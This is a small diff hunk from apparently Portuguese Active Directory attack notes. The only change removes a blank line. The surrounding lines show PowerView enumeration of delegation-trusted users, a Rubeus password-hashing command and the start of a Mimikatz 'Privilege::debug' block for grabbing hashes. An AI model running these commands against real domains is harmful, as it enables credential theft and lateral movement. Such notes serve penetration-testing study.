@@ -1440,7 +1440,6 @@ Get-DomainUser -TrustedToAuth
 ```
 rubeus.exe hash /password:123qwe..
 ```
-
 OU PEGAR O HASH DIRETO COM O MIMIKATZ:
 ```
 Privilege::debug
